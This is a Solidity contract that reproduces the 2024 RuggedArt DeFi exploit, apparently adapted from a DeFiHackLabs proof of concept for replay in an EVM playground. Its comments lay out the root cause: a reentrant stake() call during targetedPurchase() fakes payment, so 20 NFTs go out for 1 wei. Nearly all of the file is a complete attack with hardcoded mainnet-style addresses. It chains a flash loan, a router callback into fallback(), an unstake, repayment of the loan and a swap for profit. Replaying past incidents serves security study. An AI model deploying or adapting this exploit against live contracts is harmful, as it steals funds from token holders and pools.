// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-02-RuggedArt).
// The DeFiHackLabs PoC runs the entire attack INLINE in the Foundry test contract
// (testExploit + the uniswapV3FlashCallback/uniswapV3SwapCallback/fallback all live
// on ContractTest itself), so there is no standalone attack contract to deploy.
// This contract is a faithful, self-contained copy of that inline attack
// (testExploit -> run(), plus the flash/swap callbacks and the fallback that
// re-enters RuggedMarket) so the playground can deploy it and record run().
// Logic and constants are copied verbatim from test/RuggedArt_exp.sol.
//
// Root cause: RuggedMarket.targetedPurchase() validates an ETH-paid NFT purchase
// by comparing its own RUGGED balance before/after an attacker-controlled
// Universal Router swap. The attacker's Universal Router callback re-enters
// RuggedMarket.stake(), which deposits the attacker's own RUGGED and inflates the
// balance delta enough to pass the check "for free" -- the contract then ships out
// 20 NFTs (20 RUGGED of value) for 1 wei of ETH. unstake() reclaims the staked
// RUGGED (plus a reward), and the free RUGGED is dumped into the RUGGED/WETH V3
// pool for WETH profit.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IRUGGEDUNIV3POOL {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external;
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IRUGGEDPROXY {
    function claimReward() external;
    function targetedPurchase(uint256[] memory _tokenIds, UniversalRouterExecute calldata swapParam) external payable;
    function unstake(uint256 _amount) external;
    function stake(uint256 _amount) external;

    struct UniversalRouterExecute {
        bytes commands;
        bytes[] inputs;
        uint256 deadline;
    }
}

interface IRUGGED is IERC20 {
    function getTokenIdPool() external view returns (uint256[] memory);
    function ownerOf(uint256 id) external view returns (address owner);
}

contract RuggedArtDrain {
    IRUGGEDUNIV3POOL constant pool = IRUGGEDUNIV3POOL(0x99147452078fa5C6642D3E5F7efD51113A9527a5);
    IRUGGEDPROXY constant proxy = IRUGGEDPROXY(0x2648f5592c09a260C601ACde44e7f8f2944944Fb);
    IRUGGED constant RUGGED = IRUGGED(0xbE33F57f41a20b2f00DEc91DcC1169597f36221F);
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    uint256 constant flashnumber = 22 * 1e18;

    // step 0: fund this contract with 1 wei of ETH (mirrors vm.deal(address(this), 1))
    // and flash-borrow 22 RUGGED from the V3 pool; the flash callback below does the rest.
    function run() external payable {
        pool.flash(address(this), flashnumber, 0, abi.encode(0));

        bool zeroForOne = true;
        uint160 sqrtPriceLimitX96 = 4_295_128_740;
        bytes memory data = abi.encodePacked(uint8(0x61));
        int256 amountSpecified = int256(RUGGED.balanceOf(address(this)));
        pool.swap(address(this), zeroForOne, amountSpecified, sqrtPriceLimitX96, data);
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata) external {
        // step 1: pre-position the reward accumulator (attacker not yet staked).
        proxy.claimReward();

        uint256[] memory tokenId = new uint256[](20);
        tokenId[0] = 9721;
        tokenId[1] = 5163;
        tokenId[2] = 2347;
        tokenId[3] = 3145;
        tokenId[4] = 2740;
        tokenId[5] = 1878;
        tokenId[6] = 6901;
        tokenId[7] = 3061;
        tokenId[8] = 1922;
        tokenId[9] = 5301;
        tokenId[10] = 454;
        tokenId[11] = 2178;
        tokenId[12] = 8298;
        tokenId[13] = 4825;
        tokenId[14] = 9307;
        tokenId[15] = 2628;
        tokenId[16] = 6115;
        tokenId[17] = 8565;
        tokenId[18] = 7991;
        tokenId[19] = 4945;

        // step 2: Universal Router command that calls back into this contract's
        // fallback(), which is where the reentrant stake() happens.
        bytes memory commands = new bytes(1);
        commands[0] = 0x04;
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = abi.encodePacked(abi.encode(address(0)), abi.encode(address(this)), abi.encode(1));
        uint256 deadline = block.timestamp;
        IRUGGEDPROXY.UniversalRouterExecute memory swapParam =
            IRUGGEDPROXY.UniversalRouterExecute({commands: commands, inputs: inputs, deadline: deadline});

        // step 3: pay 1 wei of ETH for 20 NFTs -- the balance-delta check is
        // satisfied "for free" by the reentrant stake() triggered from fallback().
        proxy.targetedPurchase{value: 1}(tokenId, swapParam);

        // step 4: reclaim the staked RUGGED (+ a reward) that was used to fake the payment.
        proxy.unstake(RUGGED.balanceOf(address(this)));

        // step 5: repay the flash loan (22 RUGGED + 0.3% fee).
        RUGGED.transfer(address(pool), flashnumber + fee0);
    }

    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {
        if (amount0Delta > 0) {
            IERC20(IRUGGEDUNIV3POOL(msg.sender).token0()).transfer(msg.sender, uint256(amount0Delta));
        } else if (amount1Delta > 0) {
            IERC20(IRUGGEDUNIV3POOL(msg.sender).token1()).transfer(msg.sender, uint256(amount1Delta));
        }
    }

    // Universal Router's command callback lands here (mirrors the test's fallback()):
    // approve RuggedMarket for RUGGED, then re-enter stake() with the flash-borrowed
    // 22 RUGGED. This inbound deposit is what inflates targetedPurchase's balance
    // delta enough to pass the "did the swap deliver enough RUGGED?" check.
    // NOTE: deliberately no receive() -- the Universal Router's SWEEP command
    // sends the swept ETH via a plain empty-calldata call, which Solidity
    // routes to receive() if defined and to fallback() only if receive() is
    // absent. The original test contract has no receive(), so it must be
    // omitted here too for the ETH sweep to land on fallback() and trigger
    // the reentrant stake().
    fallback() external payable {
        RUGGED.approve(address(proxy), type(uint256).max);
        RUGGED.balanceOf(address(this));
        proxy.stake(flashnumber);
    }
}
